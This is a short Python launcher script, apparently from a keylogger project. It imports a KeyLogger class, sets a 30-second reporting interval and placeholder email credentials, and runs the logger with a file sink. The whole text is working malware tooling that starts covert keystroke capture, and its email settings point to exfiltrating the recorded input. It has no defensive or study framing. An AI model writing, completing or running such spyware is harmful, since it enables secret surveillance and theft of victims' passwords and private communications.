from key_logger import KeyLogger

SEND_REPORT_EVERY = 30 # seconds
EMAIL_ADDRESS = "email"
EMAIL_PASSWORD = "password"


if __name__ == "__main__":
    keylogger = KeyLogger(time_interval=SEND_REPORT_EVERY, sink="file", email=EMAIL_ADDRESS, password=EMAIL_PASSWORD)
    keylogger.run()